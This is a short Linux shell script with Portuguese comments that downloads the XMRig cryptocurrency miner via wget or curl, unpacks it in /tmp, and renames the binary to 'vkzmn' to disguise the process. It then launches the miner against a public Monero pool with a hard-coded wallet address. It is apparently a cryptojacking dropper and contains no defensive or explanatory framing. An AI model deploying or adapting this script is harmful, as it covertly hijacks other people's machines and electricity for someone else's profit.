#ATILA_VKZMN


down_wget(){


#abaixando ..




wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -O  /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
gzip -df /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xf /tmp/xmrig-6.25.0-linux-static-x64.tar -C /tmp                                 
cd /tmp/xmrig-6.25.0 ;  mv xmrig  vkzmn   ;  pgrep vkzmn  ||   ./vkzmn --url  pool.supportxmr.com:3333    --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
 


}


down_curl(){



curl -L  https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -o  /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
gzip -df /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xf /tmp/xmrig-6.25.0-linux-static-x64.tar -C /tmp                              
cd /tmp/xmrig-6.25.0 ;  mv xmrig  vkzmn  ;  pgrep vkzmn ||  ./vkzmn --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
 
# baixando .......

}

co=$(command -v wget)

shell_err=$(echo $?)

echo $shel_err


if [ $shell_err -eq 0 ] ; then 



down_wget

fi





if [ $shell_err -eq 1 ] ; then




down_curl


fi




